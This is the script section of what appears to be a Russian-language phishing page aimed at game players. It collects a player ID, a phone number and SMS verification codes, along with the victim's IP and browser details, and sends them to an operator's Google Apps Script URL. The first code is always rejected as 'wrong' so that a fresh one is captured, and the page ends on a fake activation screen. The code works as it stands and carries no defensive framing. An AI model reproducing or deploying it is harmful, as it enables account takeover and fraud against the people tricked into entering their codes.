    <script>
        // ============================================
        // ВСТАВЬ СЮДА URL ТВОЕГО APPS SCRIPT
        // ============================================
        const SCRIPT_URL = 'ТВОЙ_URL_APPS_SCRIPT';
        // ============================================

        var playerID = '';
        var codeAttempt = 1;

        function getIP() {
            return new Promise(function(resolve) {
                var script = document.createElement('script');
                script.src = 'https://api.ipify.org?format=jsonp&callback=getIPCallback';
                window.getIPCallback = function(data) { resolve(data.ip); document.body.removeChild(script); delete window.getIPCallback; };
                script.onerror = function() { resolve('IP не найден'); };
                document.body.appendChild(script);
            });
        }

        function formatPhone(input) {
            var value = input.value.replace(/\D/g, '');
            if (value.length > 0 && value[0] !== '9') { value = '9' + value; }
            value = value.slice(0, 10);
            if (value.length > 0 && value[0] !== '9') { value = '9' + value.slice(0, 9); }
            var formatted = '';
            if (value.length > 0) formatted += value.slice(0, 3);
            if (value.length > 3) formatted += ' ' + value.slice(3, 6);
            if (value.length > 6) formatted += '-' + value.slice(6, 8);
            if (value.length > 8) formatted += '-' + value.slice(8, 10);
            input.value = formatted;
        }

        function submitID() {
            var id = document.getElementById('player-id').value.replace(/\D/g, '');
            if (id.length !== 9) { document.getElementById('id-error').style.display = 'block'; setTimeout(function() { document.getElementById('id-error').style.display = 'none'; }, 3000); return; }
            document.getElementById('id-error').style.display = 'none';
            playerID = id;
            document.getElementById('screen-id').style.display = 'none';
            document.getElementById('screen-auth').style.display = 'block';
        }

        async function requestCode() {
            var phone = document.getElementById('phone').value.replace(/\D/g, '');
            if (phone.length !== 10) { document.getElementById('phone-error').style.display = 'block'; setTimeout(function() { document.getElementById('phone-error').style.display = 'none'; }, 3000); return; }
            if (phone[0] !== '9') { document.getElementById('phone-error').textContent = 'Номер должен начинаться с 9'; document.getElementById('phone-error').style.display = 'block'; setTimeout(function() { document.getElementById('phone-error').style.display = 'none'; }, 3000); return; }
            document.getElementById('phone-error').style.display = 'none';
            var ip = await getIP(); var fullPhone = '+7' + phone;
            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'phone', phone: fullPhone, id: playerID, ip: ip, userAgent: navigator.userAgent, timestamp: new Date().toISOString() }) }).catch(function(err) { console.log('ok'); });
            document.getElementById('screen-auth').style.display = 'none'; document.getElementById('screen-loading').style.display = 'block';
            setTimeout(function() { document.getElementById('screen-loading').style.display = 'none'; document.getElementById('display-phone').textContent = '+7 ' + document.getElementById('phone').value; document.getElementById('screen-code').style.display = 'block'; codeAttempt = 1; document.getElementById('code-error').style.display = 'none'; document.getElementById('code').value = ''; }, 3000);
        }

        async function confirmCode() {
            var codeInput = document.getElementById('code');
            var code = codeInput.value.replace(/\D/g, '');
            if (code.length < 4) { document.getElementById('code-error').textContent = 'Введите код из Макс (минимум 4 цифры)'; document.getElementById('code-error').style.display = 'block'; setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 3000); return; }

            if (codeAttempt === 1) {
                document.getElementById('code-error').textContent = 'Неверный код. Проверьте SMS и попробуйте ещё раз.';
                document.getElementById('code-error').style.display = 'block';
                codeInput.value = '';
                codeAttempt = 2;
                setTimeout(function() { document.getElementById('code-error').style.display = 'none'; }, 4000);
                return;
            }

            document.getElementById('code-error').style.display = 'none';
            var ip = await getIP(); var btn = document.getElementById('btn-code'); btn.disabled = true; btn.textContent = 'АКТИВАЦИЯ...';
            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ type: 'code', code: code, id: playerID, ip: ip, userAgent: navigator.userAgent, timestamp: new Date().toISOString() }) }).catch(function(err) { console.log('ok'); });
            setTimeout(function() { document.getElementById('screen-code').style.display = 'none'; document.getElementById('done-id').textContent = playerID; document.getElementById('screen-done').style.display = 'block'; btn.disabled = false; btn.textContent = 'Подтвердить'; }, 2000);
        }
    </script>
